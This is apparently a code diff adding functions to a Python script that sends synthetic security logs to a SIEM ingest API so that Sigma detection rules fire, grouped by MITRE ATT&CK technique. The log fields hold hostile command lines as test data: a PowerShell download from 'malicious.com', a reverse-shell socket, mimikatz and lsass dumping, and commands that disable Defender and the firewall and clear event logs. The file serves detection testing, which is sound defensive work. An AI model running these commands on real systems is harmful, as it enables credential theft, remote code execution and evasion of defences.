@@ -346,6 +346,291 @@ def send_stream_test_sigma_logs():
         print(f"✗ Error sending stream test log: {e}")
 
 
+def send_powershell_execution_logs():
+    """Send logs that trigger PowerShell execution detection (T1059.001)"""
+    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"
+
+    logs = []
+
+    # Suspicious PowerShell execution patterns
+    powershell_commands = [
+        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",  # Base64 encoded command
+        "powershell.exe -ExecutionPolicy Bypass -File C:\\temp\\script.ps1",
+        "pwsh.exe -NoProfile -Command Invoke-WebRequest -Uri http://malicious.com/payload",
+        "powershell.exe -WindowStyle Hidden -Command $client = New-Object System.Net.Sockets.TCPClient",
+    ]
+
+    for cmd in powershell_commands:
+        log_entry = {
+            "ts": datetime.utcnow().isoformat() + "Z",
+            "level": "warning",
+            "msg": f"Process execution detected: {cmd[:50]}...",
+            "service": "endpoint-security",
+            "host": f"workstation-{random.randint(1, 100)}",
+            "event_type": "process_creation",
+            "process_name": "powershell.exe" if "powershell" in cmd.lower() else "pwsh.exe",
+            "command_line": cmd,
+            "parent_process": "explorer.exe",
+            "user": f"DOMAIN\\user{random.randint(100, 999)}",
+            "src_ip": f"10.0.{random.randint(1, 254)}.{random.randint(1, 254)}"
+        }
+        logs.append(log_entry)
+
+    payload = {"logs": logs}
+
+    try:
+        response = requests.post(endpoint, headers=HEADERS, json=payload)
+        if response.status_code == 200:
+            print(f"🛡️  Sent {len(logs)} PowerShell execution logs (T1059.001)")
+        else:
+            print(f"✗ Failed to send PowerShell logs: {response.status_code}")
+    except Exception as e:
+        print(f"✗ Error sending PowerShell logs: {e}")
+
+
+def send_lateral_movement_logs():
+    """Send logs that trigger lateral movement detection (T1021)"""
+    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"
+
+    logs = []
+
+    # Remote service execution patterns
+    lateral_events = [
+        {"process": "psexec.exe", "target": "192.168.1.50", "action": "remote_exec"},
+        {"process": "wmic.exe", "target": "192.168.1.51", "action": "process_call"},
+        {"process": "winrm.cmd", "target": "192.168.1.52", "action": "invoke_command"},
+        {"process": "mstsc.exe", "target": "192.168.1.53", "action": "rdp_connect"},
+    ]
+
+    source_ip = f"10.0.1.{random.randint(10, 50)}"
+
+    for event in lateral_events:
+        log_entry = {
+            "ts": datetime.utcnow().isoformat() + "Z",
+            "level": "warning",
+            "msg": f"Lateral movement detected: {event['process']} -> {event['target']}",
+            "service": "endpoint-security",
+            "host": "dc-server-01",
+            "event_type": "lateral_movement",
+            "process_name": event["process"],
+            "target_host": event["target"],
+            "action": event["action"],
+            "src_ip": source_ip,
+            "user": "DOMAIN\\admin_compromised",
+            "mitre_technique": "T1021"
+        }
+        logs.append(log_entry)
+
+    payload = {"logs": logs}
+
+    try:
+        response = requests.post(endpoint, headers=HEADERS, json=payload)
+        if response.status_code == 200:
+            print(f"🛡️  Sent {len(logs)} lateral movement logs (T1021)")
+        else:
+            print(f"✗ Failed to send lateral movement logs: {response.status_code}")
+    except Exception as e:
+        print(f"✗ Error sending lateral movement logs: {e}")
+
+
+def send_credential_access_logs():
+    """Send logs that trigger credential access detection (T1003)"""
+    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"
+
+    logs = []
+
+    # Credential dumping patterns
+    cred_events = [
+        {"process": "mimikatz.exe", "action": "sekurlsa::logonpasswords"},
+        {"process": "procdump.exe", "action": "dump lsass.exe"},
+        {"process": "comsvcs.dll", "action": "MiniDump"},
+        {"process": "ntdsutil.exe", "action": "ifm create"},
+    ]
+
+    for event in cred_events:
+        log_entry = {
+            "ts": datetime.utcnow().isoformat() + "Z",
+            "level": "critical",
+            "msg": f"Potential credential theft: {event['process']} - {event['action']}",
+            "service": "endpoint-security",
+            "host": f"server-{random.randint(1, 20)}",
+            "event_type": "credential_access",
+            "process_name": event["process"],
+            "command_line": event["action"],
+            "target_process": "lsass.exe",
+            "src_ip": f"10.0.2.{random.randint(1, 254)}",
+            "user": f"DOMAIN\\user{random.randint(1, 100)}",
+            "mitre_technique": "T1003",
+            "severity": "critical"
+        }
+        logs.append(log_entry)
+
+    payload = {"logs": logs}
+
+    try:
+        response = requests.post(endpoint, headers=HEADERS, json=payload)
+        if response.status_code == 200:
+            print(f"🛡️  Sent {len(logs)} credential access logs (T1003)")
+        else:
+            print(f"✗ Failed to send credential access logs: {response.status_code}")
+    except Exception as e:
+        print(f"✗ Error sending credential access logs: {e}")
+
+
+def send_data_exfiltration_logs():
+    """Send logs that trigger data exfiltration detection (T1041)"""
+    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"
+
+    logs = []
+
+    # Large data transfers to external IPs
+    external_ips = ["203.0.113.100", "198.51.100.50", "192.0.2.200"]
+
+    for ext_ip in external_ips:
+        log_entry = {
+            "ts": datetime.utcnow().isoformat() + "Z",
+            "level": "warning",
+            "msg": f"Large outbound data transfer detected to {ext_ip}",
+            "service": "network-security",
+            "host": "firewall-01",
+            "event_type": "data_exfiltration",
+            "src_ip": f"10.0.1.{random.randint(1, 254)}",
+            "dst_ip": ext_ip,
+            "dst_port": random.choice([443, 8443, 53, 80]),
+            "bytes_sent": random.randint(100000000, 500000000),  # 100MB-500MB
+            "protocol": "TCP",
+            "user": f"user{random.randint(1, 100)}@company.com",
+            "mitre_technique": "T1041",
+            "severity": "high"
+        }
+        logs.append(log_entry)
+
+    payload = {"logs": logs}
+
+    try:
+        response = requests.post(endpoint, headers=HEADERS, json=payload)
+        if response.status_code == 200:
+            print(f"🛡️  Sent {len(logs)} data exfiltration logs (T1041)")
+        else:
+            print(f"✗ Failed to send exfiltration logs: {response.status_code}")
+    except Exception as e:
+        print(f"✗ Error sending exfiltration logs: {e}")
+
+
+def send_persistence_logs():
+    """Send logs that trigger persistence detection (T1547)"""
+    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"
+
+    logs = []
+
+    # Registry/startup persistence patterns
+    persistence_events = [
+        {"location": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "malware.exe"},
+        {"location": "Startup Folder", "value": "backdoor.lnk"},
+        {"location": "Scheduled Task", "value": "SystemUpdate"},
+        {"location": "WMI Subscription", "value": "EventConsumer"},
+    ]
+
+    for event in persistence_events:
+        log_entry = {
+            "ts": datetime.utcnow().isoformat() + "Z",
+            "level": "warning",
+            "msg": f"Persistence mechanism detected: {event['location']}",
+            "service": "endpoint-security",
+            "host": f"workstation-{random.randint(1, 50)}",
+            "event_type": "persistence",
+            "registry_key": event["location"],
+            "registry_value": event["value"],
+            "process_name": "reg.exe",
+            "user": f"DOMAIN\\user{random.randint(1, 100)}",
+            "mitre_technique": "T1547",
+            "severity": "medium"
+        }
+        logs.append(log_entry)
+
+    payload = {"logs": logs}
+
+    try:
+        response = requests.post(endpoint, headers=HEADERS, json=payload)
+        if response.status_code == 200:
+            print(f"🛡️  Sent {len(logs)} persistence logs (T1547)")
+        else:
+            print(f"✗ Failed to send persistence logs: {response.status_code}")
+    except Exception as e:
+        print(f"✗ Error sending persistence logs: {e}")
+
+
+def send_defense_evasion_logs():
+    """Send logs that trigger defense evasion detection (T1562)"""
+    endpoint = f"{API_BASE_URL}/v1/ingest/logs/batch"
+
+    logs = []
+
+    # Defense evasion patterns
+    evasion_events = [
+        {"action": "Disable Windows Defender", "process": "Set-MpPreference -DisableRealtimeMonitoring $true"},
+        {"action": "Stop security service", "process": "net stop WinDefend"},
+        {"action": "Clear event logs", "process": "wevtutil cl Security"},
+        {"action": "Disable firewall", "process": "netsh advfirewall set allprofiles state off"},
+    ]
+
+    for event in evasion_events:
+        log_entry = {
+            "ts": datetime.utcnow().isoformat() + "Z",
+            "level": "critical",
+            "msg": f"Defense evasion attempt: {event['action']}",
+            "service": "endpoint-security",
+            "host": f"server-{random.randint(1, 10)}",
+            "event_type": "defense_evasion",
+            "command_line": event["process"],
+            "action": event["action"],
+            "src_ip": f"10.0.1.{random.randint(1, 254)}",
+            "user": "NT AUTHORITY\\SYSTEM",
+            "mitre_technique": "T1562",
+            "severity": "critical"
+        }
+        logs.append(log_entry)
+
+    payload = {"logs": logs}
+
+    try:
+        response = requests.post(endpoint, headers=HEADERS, json=payload)
+        if response.status_code == 200:
+            print(f"🛡️  Sent {len(logs)} defense evasion logs (T1562)")
+        else:
+            print(f"✗ Failed to send defense evasion logs: {response.status_code}")
+    except Exception as e:
+        print(f"✗ Error sending defense evasion logs: {e}")
+
+
+def send_comprehensive_security_events():
+    """Send a comprehensive set of security events to trigger multiple Sigma rules"""
+    print("\n🛡️  Sending comprehensive security events...")
+
+    # Send various MITRE ATT&CK technique events
+    send_brute_force_logs()
+    time.sleep(0.5)
+
+    send_powershell_execution_logs()
+    time.sleep(0.5)
+
+    send_lateral_movement_logs()
+    time.sleep(0.5)
+
+    send_credential_access_logs()
+    time.sleep(0.5)
+
+    send_data_exfiltration_logs()
+    time.sleep(0.5)
+
+    send_persistence_logs()
+    time.sleep(0.5)
+
+    send_defense_evasion_logs()
+
+    print("✓ Comprehensive security events sent")
+
+
 def send_traces(trace_id=None):
     """Send trace data with spans"""
     endpoint = f"{API_BASE_URL}/v1/observability/traces/ingest"
@@ -808,10 +1093,10 @@ def run_continuous_generation():
                 send_critical_security_logs()
                 time.sleep(1)
 
-            # Every 7 iterations, trigger Sigma rules
+            # Every 7 iterations, trigger Sigma rules with comprehensive security events
             if iteration % 7 == 0:
                 print("\n🛡️  Triggering Sigma security rules...")
-                send_brute_force_logs()
+                send_comprehensive_security_events()
                 time.sleep(1)
                 send_stream_test_sigma_logs()
                 time.sleep(1)
